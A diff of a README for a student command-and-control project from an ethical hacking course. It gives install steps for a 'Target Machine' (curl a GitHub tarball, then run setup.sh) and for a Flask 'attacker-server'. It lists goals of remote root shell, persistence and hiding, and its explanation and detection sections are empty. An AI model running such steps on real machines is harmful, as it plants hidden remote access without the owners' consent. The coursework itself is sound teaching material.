@@ -1,8 +1,11 @@
 # Command-Control
 
-CS378 Ethical Hacking - Command and Control
+## CS378 Ethical Hacking - Command and Control
 
-## How to install this package
+David Trakhtengerts : dst726 and Ricky Woodruff : rgw664
+
+## Install 
+### Target Machine
 
 ```bash
 curl -L http://github.com/woodruffr4/Command-Control/archive/main.tar.gz | tar zxf -
@@ -11,7 +14,23 @@ chmod +x setup.sh
 ./setup.sh
 ```
 
-## How to run attacker-server
+### Attack Machine
 
 -   Install `flask`
--   Run `FLASK_APP=attacker-server.py flask run --host={Your server's IP}`
+-   Run the flask server    
+
+```python    
+export FLASK_APP=attacker-server.py
+flask run --host={Server IP}
+```
+
+## How it works
+## How it meets the requirements
+
+1. Provide remote root shell access 
+2. Persistence
+3. Configuration
+4. Authentication
+5. Hiding
+
+## Detection
